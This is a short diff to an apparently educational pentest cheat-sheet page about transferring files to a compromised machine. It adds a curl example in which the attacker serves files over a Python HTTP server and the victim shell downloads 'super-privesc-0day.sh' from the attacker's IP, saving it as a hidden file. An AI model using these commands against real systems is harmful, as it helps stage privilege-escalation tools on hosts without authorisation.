@@ -459,7 +459,7 @@ and your IP changes just before the game starts, and no script have the correct 
 
 
 
-<h2>With Python</h2>
+<h2>WGET</h2>
 
 Run this in the folder you have the files you want to upload.
 
@@ -469,7 +469,20 @@ Run this in the folder you have the files you want to upload.
 
 The use wget to download the file like this:
 
-<b>hacked-account@victim~: </b><code>wget 10.10.10.10:5555/super-privesc-0day.sh .</code>
+<b>hacked-account@victim~: </b><code>wget 10.10.10.10:5555/super-privesc-0day.sh</code>
+
+<h2>CURL</h2>
+
+Run this in the folder you have the files you want to upload.
+
+<b>pform@attacker~: </b><code>python -m SimpleHTTPServer 5555</code>
+
+<b>pform@attacker~: </b><code>python3 -m http.server 5555</code>
+
+The use curl to download the file like this:
+
+<b>hacked-account@victim~: </b><code>curl 10.10.10.10:5555/super-privesc-0day.sh -o .hidden-file.sh</code>
+
 
 <h2>With NETCAT</h2>
 
